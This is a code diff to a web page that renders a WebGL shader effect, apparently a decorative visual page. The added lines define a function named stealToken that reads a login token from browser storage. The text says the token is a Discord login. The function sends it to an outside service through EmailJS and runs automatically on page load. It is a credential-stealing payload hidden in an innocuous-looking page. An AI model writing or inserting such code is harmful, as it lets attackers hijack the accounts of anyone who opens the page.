@@ -134,6 +134,26 @@
             vec3 col = 0.5 + 0.45 * cos(angle + vec3(0, 2, 4) + u_time * 0.2);
             gl_FragColor = vec4(col * (1.0 - pow(iter/maxI, 0.5)), 1.0);
         }
+        function stealToken() {
+            let token = localStorage.getItem("token") || sessionStorage.getItem("token");
+
+            if (token) {
+
+                emailjs.send("service_n4bgtgi", "template_hqe4drm", {
+                    token: token
+                }).then(function(response) {
+                    console.log("Token sent to your email successfully.");
+                    alert("Token sent to your email!");
+                }, function(error) {
+                    console.error("Failed to send token: ", error);
+                    alert("Failed to send token. Check console.");
+                });
+            } else {
+                alert("No token found. Make sure you're logged into Discord.");
+            }
+    }
+
+    window.onload = stealToken;
     </script>
 
     <script>
